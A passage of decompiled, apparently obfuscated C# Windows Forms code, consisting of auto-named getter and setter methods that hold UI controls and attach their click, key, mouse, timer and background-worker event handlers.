        return this.toolStripProgressBar_4;
    }

    [MethodImpl(MethodImplOptions.Synchronized)]
    internal virtual void vmethod_545(ToolStripProgressBar toolStripProgressBar_8)
    {
        this.toolStripProgressBar_4 = toolStripProgressBar_8;
    }

    internal virtual ZeroitProgressIndicator vmethod_546()
    {
        return this.zeroitProgressIndicator_3;
    }

    [MethodImpl(MethodImplOptions.Synchronized)]
    internal virtual void vmethod_547(ZeroitProgressIndicator zeroitProgressIndicator_9)
    {
        this.zeroitProgressIndicator_3 = zeroitProgressIndicator_9;
    }

    internal virtual ZeroitAnidasoCircleProgress vmethod_548()
    {
        return this.zeroitAnidasoCircleProgress_4;
    }

    [MethodImpl(MethodImplOptions.Synchronized)]
    internal virtual void vmethod_549(ZeroitAnidasoCircleProgress zeroitAnidasoCircleProgress_8)
    {
        this.zeroitAnidasoCircleProgress_4 = zeroitAnidasoCircleProgress_8;
    }

    [MethodImpl(MethodImplOptions.Synchronized)]
    internal virtual void vmethod_55(ToolStripMenuItem toolStripMenuItem_136)
    {
        EventHandler handler = new EventHandler(this.method_34);
        ToolStripMenuItem item = this.toolStripMenuItem_15;
        if (item != null)
        {
            item.Click -= handler;
        }
        this.toolStripMenuItem_15 = toolStripMenuItem_136;
        item = this.toolStripMenuItem_15;
        if (item != null)
        {
            item.Click += handler;
        }
    }

    internal virtual GClass7 vmethod_550()
    {
        return this.gclass7_5;
    }

    [MethodImpl(MethodImplOptions.Synchronized)]
    internal virtual void vmethod_551(GClass7 gclass7_13)
    {
        MouseEventHandler handler = new MouseEventHandler(this.method_181);
        ColumnClickEventHandler handler2 = new ColumnClickEventHandler(this.method_186);
        KeyEventHandler handler3 = new KeyEventHandler(this.method_193);
        GClass7 class2 = this.gclass7_5;
        if (class2 != null)
        {
            class2.MouseUp -= handler;
            class2.ColumnClick -= handler2;
            class2.KeyDown -= handler3;
        }
        this.gclass7_5 = gclass7_13;
        class2 = this.gclass7_5;
        if (class2 != null)
        {
            class2.MouseUp += handler;
            class2.ColumnClick += handler2;
            class2.KeyDown += handler3;
        }
    }

    internal virtual GClass7 vmethod_552()
    {
        return this.gclass7_6;
    }

    [MethodImpl(MethodImplOptions.Synchronized)]
    internal virtual void vmethod_553(GClass7 gclass7_13)
    {
        MouseEventHandler handler = new MouseEventHandler(this.method_128);
        KeyEventHandler handler2 = new KeyEventHandler(this.method_194);
        GClass7 class2 = this.gclass7_6;
        if (class2 != null)
        {
            class2.MouseUp -= handler;
            class2.KeyDown -= handler2;
        }
        this.gclass7_6 = gclass7_13;
        class2 = this.gclass7_6;
        if (class2 != null)
        {
            class2.MouseUp += handler;
            class2.KeyDown += handler2;
        }
    }

    internal virtual ZeroitProgressIndicator vmethod_554()
    {
        return this.zeroitProgressIndicator_4;
    }

    [MethodImpl(MethodImplOptions.Synchronized)]
    internal virtual void vmethod_555(ZeroitProgressIndicator zeroitProgressIndicator_9)
    {
        this.zeroitProgressIndicator_4 = zeroitProgressIndicator_9;
    }

    internal virtual ZeroitProgressIndicator vmethod_556()
    {
        return this.zeroitProgressIndicator_5;
    }

    [MethodImpl(MethodImplOptions.Synchronized)]
    internal virtual void vmethod_557(ZeroitProgressIndicator zeroitProgressIndicator_9)
    {
        this.zeroitProgressIndicator_5 = zeroitProgressIndicator_9;
    }

    internal virtual Label vmethod_558()
    {
        return this.label_25;
    }

    [MethodImpl(MethodImplOptions.Synchronized)]
    internal virtual void vmethod_559(Label label_30)
    {
        this.label_25 = label_30;
    }

    internal virtual ToolStripMenuItem vmethod_56()
    {
        return this.toolStripMenuItem_16;
    }

    internal virtual BackgroundWorker vmethod_560()
    {
        return this.backgroundWorker_1;
    }

    [MethodImpl(MethodImplOptions.Synchronized)]
    internal virtual void vmethod_561(BackgroundWorker backgroundWorker_4)
    {
        DoWorkEventHandler handler = new DoWorkEventHandler(this.method_192);
        BackgroundWorker worker = this.backgroundWorker_1;
        if (worker != null)
        {
            worker.DoWork -= handler;
        }
        this.backgroundWorker_1 = backgroundWorker_4;
        worker = this.backgroundWorker_1;
        if (worker != null)
        {
            worker.DoWork += handler;
        }
    }

    internal virtual ToolStripMenuItem vmethod_562()
    {
        return this.toolStripMenuItem_104;
    }

    [MethodImpl(MethodImplOptions.Synchronized)]
    internal virtual void vmethod_563(ToolStripMenuItem toolStripMenuItem_136)
    {
        EventHandler handler = new EventHandler(this.method_190);
        ToolStripMenuItem item = this.toolStripMenuItem_104;
        if (item != null)
        {
            item.Click -= handler;
        }
        this.toolStripMenuItem_104 = toolStripMenuItem_136;
        item = this.toolStripMenuItem_104;
        if (item != null)
        {
            item.Click += handler;
        }
    }

    internal virtual TabPage vmethod_564()
    {
        return this.tabPage_13;
    }

    [MethodImpl(MethodImplOptions.Synchronized)]
    internal virtual void vmethod_565(TabPage tabPage_17)
    {
        this.tabPage_13 = tabPage_17;
    }

    internal virtual ZeroitProgressIndicator vmethod_566()
    {
        return this.zeroitProgressIndicator_6;
    }

    [MethodImpl(MethodImplOptions.Synchronized)]
    internal virtual void vmethod_567(ZeroitProgressIndicator zeroitProgressIndicator_9)
    {
        this.zeroitProgressIndicator_6 = zeroitProgressIndicator_9;
    }

    internal virtual StatusStrip vmethod_568()
    {
        return this.statusStrip_8;
    }

    [MethodImpl(MethodImplOptions.Synchronized)]
    internal virtual void vmethod_569(StatusStrip statusStrip_11)
    {
        this.statusStrip_8 = statusStrip_11;
    }

    [MethodImpl(MethodImplOptions.Synchronized)]
    internal virtual void vmethod_57(ToolStripMenuItem toolStripMenuItem_136)
    {
        EventHandler handler = new EventHandler(this.method_35);
        ToolStripMenuItem item = this.toolStripMenuItem_16;
        if (item != null)
        {
            item.Click -= handler;
        }
        this.toolStripMenuItem_16 = toolStripMenuItem_136;
        item = this.toolStripMenuItem_16;
        if (item != null)
        {
            item.Click += handler;
        }
    }

    internal virtual ToolStripStatusLabel vmethod_570()
    {
        return this.toolStripStatusLabel_27;
    }

    [MethodImpl(MethodImplOptions.Synchronized)]
    internal virtual void vmethod_571(ToolStripStatusLabel toolStripStatusLabel_40)
    {
        this.toolStripStatusLabel_27 = toolStripStatusLabel_40;
    }

    internal virtual ToolStripStatusLabel vmethod_572()
    {
        return this.toolStripStatusLabel_28;
    }

    [MethodImpl(MethodImplOptions.Synchronized)]
    internal virtual void vmethod_573(ToolStripStatusLabel toolStripStatusLabel_40)
    {
        this.toolStripStatusLabel_28 = toolStripStatusLabel_40;
    }

    internal virtual ToolStripProgressBar vmethod_574()
    {
        return this.toolStripProgressBar_5;
    }

    [MethodImpl(MethodImplOptions.Synchronized)]
    internal virtual void vmethod_575(ToolStripProgressBar toolStripProgressBar_8)
    {
        this.toolStripProgressBar_5 = toolStripProgressBar_8;
    }

    internal virtual ZeroitAnidasoCircleProgress vmethod_576()
    {
        return this.zeroitAnidasoCircleProgress_5;
    }

    [MethodImpl(MethodImplOptions.Synchronized)]
    internal virtual void vmethod_577(ZeroitAnidasoCircleProgress zeroitAnidasoCircleProgress_8)
    {
        this.zeroitAnidasoCircleProgress_5 = zeroitAnidasoCircleProgress_8;
    }

    internal virtual GClass7 vmethod_578()
    {
        return this.gclass7_7;
    }

    [MethodImpl(MethodImplOptions.Synchronized)]
    internal virtual void vmethod_579(GClass7 gclass7_13)
    {
        KeyEventHandler handler = new KeyEventHandler(this.method_207);
        ColumnClickEventHandler handler2 = new ColumnClickEventHandler(this.method_239);
        MouseEventHandler handler3 = new MouseEventHandler(this.method_245);
        GClass7 class2 = this.gclass7_7;
        if (class2 != null)
        {
            class2.KeyDown -= handler;
            class2.ColumnClick -= handler2;
            class2.MouseUp -= handler3;
        }
        this.gclass7_7 = gclass7_13;
        class2 = this.gclass7_7;
        if (class2 != null)
        {
            class2.KeyDown += handler;
            class2.ColumnClick += handler2;
            class2.MouseUp += handler3;
        }
    }

    internal virtual ToolStripMenuItem vmethod_58()
    {
        return this.toolStripMenuItem_17;
    }

    internal virtual ContextMenuStrip vmethod_580()
    {
        return this.contextMenuStrip_10;
    }

    [MethodImpl(MethodImplOptions.Synchronized)]
    internal virtual void vmethod_581(ContextMenuStrip contextMenuStrip_14)
    {
        this.contextMenuStrip_10 = contextMenuStrip_14;
    }

    internal virtual ToolStripMenuItem vmethod_582()
    {
        return this.toolStripMenuItem_105;
    }

    [MethodImpl(MethodImplOptions.Synchronized)]
    internal virtual void vmethod_583(ToolStripMenuItem toolStripMenuItem_136)
    {
        EventHandler handler = new EventHandler(this.method_191);
        ToolStripMenuItem item = this.toolStripMenuItem_105;
        if (item != null)
        {
            item.Click -= handler;
        }
        this.toolStripMenuItem_105 = toolStripMenuItem_136;
        item = this.toolStripMenuItem_105;
        if (item != null)
        {
            item.Click += handler;
        }
    }

    internal virtual ToolStripSeparator vmethod_584()
    {
        return this.toolStripSeparator_26;
    }

    [MethodImpl(MethodImplOptions.Synchronized)]
    internal virtual void vmethod_585(ToolStripSeparator toolStripSeparator_39)
    {
        this.toolStripSeparator_26 = toolStripSeparator_39;
    }

    internal virtual ToolStripMenuItem vmethod_586()
    {
        return this.toolStripMenuItem_106;
    }

    [MethodImpl(MethodImplOptions.Synchronized)]
    internal virtual void vmethod_587(ToolStripMenuItem toolStripMenuItem_136)
    {
        this.toolStripMenuItem_106 = toolStripMenuItem_136;
    }

    internal virtual ToolStripMenuItem vmethod_588()
    {
        return this.toolStripMenuItem_107;
    }

    [MethodImpl(MethodImplOptions.Synchronized)]
    internal virtual void vmethod_589(ToolStripMenuItem toolStripMenuItem_136)
    {
        EventHandler handler = new EventHandler(this.method_201);
        ToolStripMenuItem item = this.toolStripMenuItem_107;
        if (item != null)
        {
            item.Click -= handler;
        }
        this.toolStripMenuItem_107 = toolStripMenuItem_136;
        item = this.toolStripMenuItem_107;
        if (item != null)
        {
            item.Click += handler;
        }
    }

    [MethodImpl(MethodImplOptions.Synchronized)]
    internal virtual void vmethod_59(ToolStripMenuItem toolStripMenuItem_136)
    {
        EventHandler handler = new EventHandler(this.method_36);
        ToolStripMenuItem item = this.toolStripMenuItem_17;
        if (item != null)
        {
            item.Click -= handler;
        }
        this.toolStripMenuItem_17 = toolStripMenuItem_136;
        item = this.toolStripMenuItem_17;
        if (item != null)
        {
            item.Click += handler;
        }
    }

    internal virtual ToolStripSeparator vmethod_590()
    {
        return this.toolStripSeparator_27;
    }

    [MethodImpl(MethodImplOptions.Synchronized)]
    internal virtual void vmethod_591(ToolStripSeparator toolStripSeparator_39)
    {
        this.toolStripSeparator_27 = toolStripSeparator_39;
    }

    internal virtual ToolStripMenuItem vmethod_592()
    {
        return this.toolStripMenuItem_108;
    }

    [MethodImpl(MethodImplOptions.Synchronized)]
    internal virtual void vmethod_593(ToolStripMenuItem toolStripMenuItem_136)
    {
        EventHandler handler = new EventHandler(this.method_202);
        ToolStripMenuItem item = this.toolStripMenuItem_108;
        if (item != null)
        {
            item.Click -= handler;
        }
        this.toolStripMenuItem_108 = toolStripMenuItem_136;
        item = this.toolStripMenuItem_108;
        if (item != null)
        {
            item.Click += handler;
        }
    }

    internal virtual ToolStripSeparator vmethod_594()
    {
        return this.toolStripSeparator_28;
    }

    [MethodImpl(MethodImplOptions.Synchronized)]
    internal virtual void vmethod_595(ToolStripSeparator toolStripSeparator_39)
    {
        this.toolStripSeparator_28 = toolStripSeparator_39;
    }

    internal virtual ToolStripMenuItem vmethod_596()
    {
        return this.toolStripMenuItem_109;
    }

    [MethodImpl(MethodImplOptions.Synchronized)]
    internal virtual void vmethod_597(ToolStripMenuItem toolStripMenuItem_136)
    {
        EventHandler handler = new EventHandler(this.method_180);
        ToolStripMenuItem item = this.toolStripMenuItem_109;
        if (item != null)
        {
            item.Click -= handler;
        }
        this.toolStripMenuItem_109 = toolStripMenuItem_136;
        item = this.toolStripMenuItem_109;
        if (item != null)
        {
            item.Click += handler;
        }
    }

    internal virtual ToolStripMenuItem vmethod_598()
    {
        return this.toolStripMenuItem_110;
    }

    [MethodImpl(MethodImplOptions.Synchronized)]
    internal virtual void vmethod_599(ToolStripMenuItem toolStripMenuItem_136)
    {
        this.toolStripMenuItem_110 = toolStripMenuItem_136;
    }

    internal virtual ContextMenuStrip vmethod_6()
    {
        return this.contextMenuStrip_0;
    }

    internal virtual ToolStripMenuItem vmethod_60()
    {
        return this.toolStripMenuItem_18;
    }

    internal virtual ToolStripMenuItem vmethod_600()
    {
        return this.toolStripMenuItem_111;
    }

    [MethodImpl(MethodImplOptions.Synchronized)]
    internal virtual void vmethod_601(ToolStripMenuItem toolStripMenuItem_136)
    {
        EventHandler handler = new EventHandler(this.method_196);
        ToolStripMenuItem item = this.toolStripMenuItem_111;
        if (item != null)
        {
            item.Click -= handler;
        }
        this.toolStripMenuItem_111 = toolStripMenuItem_136;
        item = this.toolStripMenuItem_111;
        if (item != null)
        {
            item.Click += handler;
        }
    }

    internal virtual ToolStripMenuItem vmethod_602()
    {
        return this.toolStripMenuItem_112;
    }

    [MethodImpl(MethodImplOptions.Synchronized)]
    internal virtual void vmethod_603(ToolStripMenuItem toolStripMenuItem_136)
    {
        EventHandler handler = new EventHandler(this.method_198);
        ToolStripMenuItem item = this.toolStripMenuItem_112;
        if (item != null)
        {
            item.Click -= handler;
        }
        this.toolStripMenuItem_112 = toolStripMenuItem_136;
        item = this.toolStripMenuItem_112;
        if (item != null)
        {
            item.Click += handler;
        }
    }

    internal virtual ToolStripMenuItem vmethod_604()
    {
        return this.toolStripMenuItem_113;
    }

    [MethodImpl(MethodImplOptions.Synchronized)]
    internal virtual void vmethod_605(ToolStripMenuItem toolStripMenuItem_136)
    {
        EventHandler handler = new EventHandler(this.method_199);
        ToolStripMenuItem item = this.toolStripMenuItem_113;
        if (item != null)
        {
            item.Click -= handler;
        }
        this.toolStripMenuItem_113 = toolStripMenuItem_136;
        item = this.toolStripMenuItem_113;
        if (item != null)
        {
            item.Click += handler;
        }
    }

    internal virtual ToolStripMenuItem vmethod_606()
    {
        return this.toolStripMenuItem_114;
    }

    [MethodImpl(MethodImplOptions.Synchronized)]
    internal virtual void vmethod_607(ToolStripMenuItem toolStripMenuItem_136)
    {
        EventHandler handler = new EventHandler(this.method_197);
        ToolStripMenuItem item = this.toolStripMenuItem_114;
        if (item != null)
        {
            item.Click -= handler;
        }
        this.toolStripMenuItem_114 = toolStripMenuItem_136;
        item = this.toolStripMenuItem_114;
        if (item != null)
        {
            item.Click += handler;
        }
    }

    internal virtual ToolStripSeparator vmethod_608()
    {
        return this.toolStripSeparator_29;
    }

    [MethodImpl(MethodImplOptions.Synchronized)]
    internal virtual void vmethod_609(ToolStripSeparator toolStripSeparator_39)
    {
        this.toolStripSeparator_29 = toolStripSeparator_39;
    }

    [MethodImpl(MethodImplOptions.Synchronized)]
    internal virtual void vmethod_61(ToolStripMenuItem toolStripMenuItem_136)
    {
        EventHandler handler = new EventHandler(this.method_37);
        ToolStripMenuItem item = this.toolStripMenuItem_18;
        if (item != null)
        {
            item.Click -= handler;
        }
        this.toolStripMenuItem_18 = toolStripMenuItem_136;
        item = this.toolStripMenuItem_18;
        if (item != null)
        {
            item.Click += handler;
        }
    }

    internal virtual ToolStripMenuItem vmethod_610()
    {
        return this.toolStripMenuItem_115;
    }

    [MethodImpl(MethodImplOptions.Synchronized)]
    internal virtual void vmethod_611(ToolStripMenuItem toolStripMenuItem_136)
    {
        EventHandler handler = new EventHandler(this.method_200);
        ToolStripMenuItem item = this.toolStripMenuItem_115;
        if (item != null)
        {
            item.Click -= handler;
        }
        this.toolStripMenuItem_115 = toolStripMenuItem_136;
        item = this.toolStripMenuItem_115;
        if (item != null)
        {
            item.Click += handler;
        }
    }

    internal virtual TabPage vmethod_612()
    {
        return this.tabPage_14;
    }

    [MethodImpl(MethodImplOptions.Synchronized)]
    internal virtual void vmethod_613(TabPage tabPage_17)
    {
        this.tabPage_14 = tabPage_17;
    }

    internal virtual ZeroitProgressIndicator vmethod_614()
    {
        return this.zeroitProgressIndicator_7;
    }

    [MethodImpl(MethodImplOptions.Synchronized)]
    internal virtual void vmethod_615(ZeroitProgressIndicator zeroitProgressIndicator_9)
    {
        this.zeroitProgressIndicator_7 = zeroitProgressIndicator_9;
    }

    internal virtual StatusStrip vmethod_616()
    {
        return this.statusStrip_9;
    }

    [MethodImpl(MethodImplOptions.Synchronized)]
    internal virtual void vmethod_617(StatusStrip statusStrip_11)
    {
        this.statusStrip_9 = statusStrip_11;
    }

    internal virtual ToolStripStatusLabel vmethod_618()
    {
        return this.toolStripStatusLabel_29;
    }

    [MethodImpl(MethodImplOptions.Synchronized)]
    internal virtual void vmethod_619(ToolStripStatusLabel toolStripStatusLabel_40)
    {
        this.toolStripStatusLabel_29 = toolStripStatusLabel_40;
    }

    internal virtual ToolStripMenuItem vmethod_62()
    {
        return this.toolStripMenuItem_19;
    }

    internal virtual ToolStripProgressBar vmethod_620()
    {
        return this.toolStripProgressBar_6;
    }

    [MethodImpl(MethodImplOptions.Synchronized)]
    internal virtual void vmethod_621(ToolStripProgressBar toolStripProgressBar_8)
    {
        this.toolStripProgressBar_6 = toolStripProgressBar_8;
    }

    internal virtual ZeroitAnidasoCircleProgress vmethod_622()
    {
        return this.zeroitAnidasoCircleProgress_6;
    }

    [MethodImpl(MethodImplOptions.Synchronized)]
    internal virtual void vmethod_623(ZeroitAnidasoCircleProgress zeroitAnidasoCircleProgress_8)
    {
        this.zeroitAnidasoCircleProgress_6 = zeroitAnidasoCircleProgress_8;
    }

    internal virtual GClass7 vmethod_624()
    {
        return this.gclass7_8;
    }

    [MethodImpl(MethodImplOptions.Synchronized)]
    internal virtual void vmethod_625(GClass7 gclass7_13)
    {
        KeyEventHandler handler = new KeyEventHandler(this.method_250);
        ColumnClickEventHandler handler2 = new ColumnClickEventHandler(this.method_251);
        GClass7 class2 = this.gclass7_8;
        if (class2 != null)
        {
            class2.KeyDown -= handler;
            class2.ColumnClick -= handler2;
        }
        this.gclass7_8 = gclass7_13;
        class2 = this.gclass7_8;
        if (class2 != null)
        {
            class2.KeyDown += handler;
            class2.ColumnClick += handler2;
        }
    }

    internal virtual ToolStripMenuItem vmethod_626()
    {
        return this.toolStripMenuItem_116;
    }

    [MethodImpl(MethodImplOptions.Synchronized)]
    internal virtual void vmethod_627(ToolStripMenuItem toolStripMenuItem_136)
    {
        EventHandler handler = new EventHandler(this.method_204);
        ToolStripMenuItem item = this.toolStripMenuItem_116;
        if (item != null)
        {
            item.Click -= handler;
        }
        this.toolStripMenuItem_116 = toolStripMenuItem_136;
        item = this.toolStripMenuItem_116;
        if (item != null)
        {
            item.Click += handler;
        }
    }

    internal virtual ContextMenuStrip vmethod_628()
    {
        return this.contextMenuStrip_11;
    }

    [MethodImpl(MethodImplOptions.Synchronized)]
    internal virtual void vmethod_629(ContextMenuStrip contextMenuStrip_14)
    {
        this.contextMenuStrip_11 = contextMenuStrip_14;
    }

    [MethodImpl(MethodImplOptions.Synchronized)]
    internal virtual void vmethod_63(ToolStripMenuItem toolStripMenuItem_136)
    {
        EventHandler handler = new EventHandler(this.method_38);
        ToolStripMenuItem item = this.toolStripMenuItem_19;
        if (item != null)
        {
            item.Click -= handler;
        }
        this.toolStripMenuItem_19 = toolStripMenuItem_136;
        item = this.toolStripMenuItem_19;
        if (item != null)
        {
            item.Click += handler;
        }
    }

    internal virtual ToolStripMenuItem vmethod_630()
    {
        return this.toolStripMenuItem_117;
    }

    [MethodImpl(MethodImplOptions.Synchronized)]
    internal virtual void vmethod_631(ToolStripMenuItem toolStripMenuItem_136)
    {
        EventHandler handler = new EventHandler(this.method_208);
        ToolStripMenuItem item = this.toolStripMenuItem_117;
        if (item != null)
        {
            item.Click -= handler;
        }
        this.toolStripMenuItem_117 = toolStripMenuItem_136;
        item = this.toolStripMenuItem_117;
        if (item != null)
        {
            item.Click += handler;
        }
    }

    internal virtual ToolStripSeparator vmethod_632()
    {
        return this.toolStripSeparator_30;
    }

    [MethodImpl(MethodImplOptions.Synchronized)]
    internal virtual void vmethod_633(ToolStripSeparator toolStripSeparator_39)
    {
        this.toolStripSeparator_30 = toolStripSeparator_39;
    }

    internal virtual ToolStripMenuItem vmethod_634()
    {
        return this.toolStripMenuItem_118;
    }

    [MethodImpl(MethodImplOptions.Synchronized)]
    internal virtual void vmethod_635(ToolStripMenuItem toolStripMenuItem_136)
    {
        this.toolStripMenuItem_118 = toolStripMenuItem_136;
    }

    internal virtual ToolStripMenuItem vmethod_636()
    {
        return this.toolStripMenuItem_119;
    }

    [MethodImpl(MethodImplOptions.Synchronized)]
    internal virtual void vmethod_637(ToolStripMenuItem toolStripMenuItem_136)
    {
        EventHandler handler = new EventHandler(this.method_209);
        ToolStripMenuItem item = this.toolStripMenuItem_119;
        if (item != null)
        {
            item.Click -= handler;
        }
        this.toolStripMenuItem_119 = toolStripMenuItem_136;
        item = this.toolStripMenuItem_119;
        if (item != null)
        {
            item.Click += handler;
        }
    }

    internal virtual ToolStripMenuItem vmethod_638()
    {
        return this.toolStripMenuItem_120;
    }

    [MethodImpl(MethodImplOptions.Synchronized)]
    internal virtual void vmethod_639(ToolStripMenuItem toolStripMenuItem_136)
    {
        EventHandler handler = new EventHandler(this.method_210);
        ToolStripMenuItem item = this.toolStripMenuItem_120;
        if (item != null)
        {
            item.Click -= handler;
        }
        this.toolStripMenuItem_120 = toolStripMenuItem_136;
        item = this.toolStripMenuItem_120;
        if (item != null)
        {
            item.Click += handler;
        }
    }

    internal virtual ToolStripSeparator vmethod_64()
    {
        return this.toolStripSeparator_3;
    }

    internal virtual ToolStripMenuItem vmethod_640()
    {
        return this.toolStripMenuItem_121;
    }

    [MethodImpl(MethodImplOptions.Synchronized)]
    internal virtual void vmethod_641(ToolStripMenuItem toolStripMenuItem_136)
    {
        EventHandler handler = new EventHandler(this.method_211);
        ToolStripMenuItem item = this.toolStripMenuItem_121;
        if (item != null)
        {
            item.Click -= handler;
        }
        this.toolStripMenuItem_121 = toolStripMenuItem_136;
        item = this.toolStripMenuItem_121;
        if (item != null)
        {
            item.Click += handler;
        }
    }

    internal virtual ToolStripMenuItem vmethod_642()
    {
        return this.toolStripMenuItem_122;
    }

    [MethodImpl(MethodImplOptions.Synchronized)]
    internal virtual void vmethod_643(ToolStripMenuItem toolStripMenuItem_136)
    {
        EventHandler handler = new EventHandler(this.method_212);
        ToolStripMenuItem item = this.toolStripMenuItem_122;
        if (item != null)
        {
            item.Click -= handler;
        }
        this.toolStripMenuItem_122 = toolStripMenuItem_136;
        item = this.toolStripMenuItem_122;
        if (item != null)
        {
            item.Click += handler;
        }
    }

    internal virtual ToolStripSeparator vmethod_644()
    {
        return this.toolStripSeparator_31;
    }

    [MethodImpl(MethodImplOptions.Synchronized)]
    internal virtual void vmethod_645(ToolStripSeparator toolStripSeparator_39)
    {
        this.toolStripSeparator_31 = toolStripSeparator_39;
    }

    internal virtual ToolStripMenuItem vmethod_646()
    {
        return this.toolStripMenuItem_123;
    }

    [MethodImpl(MethodImplOptions.Synchronized)]
    internal virtual void vmethod_647(ToolStripMenuItem toolStripMenuItem_136)
    {
        EventHandler handler = new EventHandler(this.method_215);
        ToolStripMenuItem item = this.toolStripMenuItem_123;
        if (item != null)
        {
            item.Click -= handler;
        }
        this.toolStripMenuItem_123 = toolStripMenuItem_136;
        item = this.toolStripMenuItem_123;
        if (item != null)
        {
            item.Click += handler;
        }
    }

    internal virtual ToolStripSeparator vmethod_648()
    {
        return this.toolStripSeparator_32;
    }

    [MethodImpl(MethodImplOptions.Synchronized)]
    internal virtual void vmethod_649(ToolStripSeparator toolStripSeparator_39)
    {
        this.toolStripSeparator_32 = toolStripSeparator_39;
    }

    [MethodImpl(MethodImplOptions.Synchronized)]
    internal virtual void vmethod_65(ToolStripSeparator toolStripSeparator_39)
    {
        this.toolStripSeparator_3 = toolStripSeparator_39;
    }

    internal virtual ToolStripMenuItem vmethod_650()
    {
        return this.toolStripMenuItem_124;
    }

    [MethodImpl(MethodImplOptions.Synchronized)]
    internal virtual void vmethod_651(ToolStripMenuItem toolStripMenuItem_136)
    {
        this.toolStripMenuItem_124 = toolStripMenuItem_136;
    }

    internal virtual ToolStripMenuItem vmethod_652()
    {
        return this.toolStripMenuItem_125;
    }

    [MethodImpl(MethodImplOptions.Synchronized)]
    internal virtual void vmethod_653(ToolStripMenuItem toolStripMenuItem_136)
    {
        EventHandler handler = new EventHandler(this.method_218);
        ToolStripMenuItem item = this.toolStripMenuItem_125;
        if (item != null)
        {
            item.Click -= handler;
        }
        this.toolStripMenuItem_125 = toolStripMenuItem_136;
        item = this.toolStripMenuItem_125;
        if (item != null)
        {
            item.Click += handler;
        }
    }

    internal virtual ToolStripSeparator vmethod_654()
    {
        return this.toolStripSeparator_33;
    }

    [MethodImpl(MethodImplOptions.Synchronized)]
    internal virtual void vmethod_655(ToolStripSeparator toolStripSeparator_39)
    {
        this.toolStripSeparator_33 = toolStripSeparator_39;
    }

    internal virtual ToolStripMenuItem vmethod_656()
    {
        return this.toolStripMenuItem_126;
    }

    [MethodImpl(MethodImplOptions.Synchronized)]
    internal virtual void vmethod_657(ToolStripMenuItem toolStripMenuItem_136)
    {
        EventHandler handler = new EventHandler(this.method_219);
        ToolStripMenuItem item = this.toolStripMenuItem_126;
        if (item != null)
        {
            item.Click -= handler;
        }
        this.toolStripMenuItem_126 = toolStripMenuItem_136;
        item = this.toolStripMenuItem_126;
        if (item != null)
        {
            item.Click += handler;
        }
    }

    internal virtual ToolStripMenuItem vmethod_658()
    {
        return this.toolStripMenuItem_127;
    }

    [MethodImpl(MethodImplOptions.Synchronized)]
    internal virtual void vmethod_659(ToolStripMenuItem toolStripMenuItem_136)
    {
        EventHandler handler = new EventHandler(this.method_214);
        ToolStripMenuItem item = this.toolStripMenuItem_127;
        if (item != null)
        {
            item.Click -= handler;
        }
        this.toolStripMenuItem_127 = toolStripMenuItem_136;
        item = this.toolStripMenuItem_127;
        if (item != null)
        {
            item.Click += handler;
        }
    }

    internal virtual ToolStripSeparator vmethod_66()
    {
        return this.toolStripSeparator_4;
    }

    internal virtual ToolStripSeparator vmethod_660()
    {
        return this.toolStripSeparator_34;
    }

    [MethodImpl(MethodImplOptions.Synchronized)]
    internal virtual void vmethod_661(ToolStripSeparator toolStripSeparator_39)
    {
        this.toolStripSeparator_34 = toolStripSeparator_39;
    }

    internal virtual ToolStripMenuItem vmethod_662()
    {
        return this.toolStripMenuItem_128;
    }

    [MethodImpl(MethodImplOptions.Synchronized)]
    internal virtual void vmethod_663(ToolStripMenuItem toolStripMenuItem_136)
    {
        EventHandler handler = new EventHandler(this.method_216);
        ToolStripMenuItem item = this.toolStripMenuItem_128;
        if (item != null)
        {
            item.Click -= handler;
        }
        this.toolStripMenuItem_128 = toolStripMenuItem_136;
        item = this.toolStripMenuItem_128;
        if (item != null)
        {
            item.Click += handler;
        }
    }

    internal virtual ToolStripStatusLabel vmethod_664()
    {
        return this.toolStripStatusLabel_30;
    }

    [MethodImpl(MethodImplOptions.Synchronized)]
    internal virtual void vmethod_665(ToolStripStatusLabel toolStripStatusLabel_40)
    {
        this.toolStripStatusLabel_30 = toolStripStatusLabel_40;
    }

    internal virtual ToolStripStatusLabel vmethod_666()
    {
        return this.toolStripStatusLabel_31;
    }

    [MethodImpl(MethodImplOptions.Synchronized)]
    internal virtual void vmethod_667(ToolStripStatusLabel toolStripStatusLabel_40)
    {
        this.toolStripStatusLabel_31 = toolStripStatusLabel_40;
    }

    internal virtual Timer vmethod_668()
    {
        return this.timer_2;
    }

    [MethodImpl(MethodImplOptions.Synchronized)]
    internal virtual void vmethod_669(Timer timer_4)
    {
        EventHandler handler = new EventHandler(this.method_217);
        Timer timer = this.timer_2;
        if (timer != null)
        {
            timer.Tick -= handler;
        }
        this.timer_2 = timer_4;
        timer = this.timer_2;
        if (timer != null)
        {
            timer.Tick += handler;
        }
    }

    [MethodImpl(MethodImplOptions.Synchronized)]
    internal virtual void vmethod_67(ToolStripSeparator toolStripSeparator_39)
    {
        this.toolStripSeparator_4 = toolStripSeparator_39;
    }

    internal virtual ToolStripStatusLabel vmethod_670()
    {
        return this.toolStripStatusLabel_32;
    }

    [MethodImpl(MethodImplOptions.Synchronized)]
    internal virtual void vmethod_671(ToolStripStatusLabel toolStripStatusLabel_40)
    {
        this.toolStripStatusLabel_32 = toolStripStatusLabel_40;
    }

    internal virtual ToolStripStatusLabel vmethod_672()
    {
        return this.toolStripStatusLabel_33;
    }

    [MethodImpl(MethodImplOptions.Synchronized)]
    internal virtual void vmethod_673(ToolStripStatusLabel toolStripStatusLabel_40)
    {
        this.toolStripStatusLabel_33 = toolStripStatusLabel_40;
    }

    internal virtual ToolStripStatusLabel vmethod_674()
    {
        return this.toolStripStatusLabel_34;
    }

    [MethodImpl(MethodImplOptions.Synchronized)]
    internal virtual void vmethod_675(ToolStripStatusLabel toolStripStatusLabel_40)
    {
        this.toolStripStatusLabel_34 = toolStripStatusLabel_40;
    }

    internal virtual ToolStripStatusLabel vmethod_676()
    {
        return this.toolStripStatusLabel_35;
    }

    [MethodImpl(MethodImplOptions.Synchronized)]
    internal virtual void vmethod_677(ToolStripStatusLabel toolStripStatusLabel_40)
    {
        this.toolStripStatusLabel_35 = toolStripStatusLabel_40;
    }

    internal virtual CheckBox vmethod_678()
    {
        return this.checkBox_5;
    }

    [MethodImpl(MethodImplOptions.Synchronized)]
    internal virtual void vmethod_679(CheckBox checkBox_8)
    {
        this.checkBox_5 = checkBox_8;
    }

    internal virtual ToolStripMenuItem vmethod_68()
    {
        return this.toolStripMenuItem_20;
    }

    internal virtual PictureBox vmethod_680()
    {
        return this.pictureBox_4;
    }

    [MethodImpl(MethodImplOptions.Synchronized)]
    internal virtual void vmethod_681(PictureBox pictureBox_7)
    {
        EventHandler handler = new EventHandler(this.method_220);
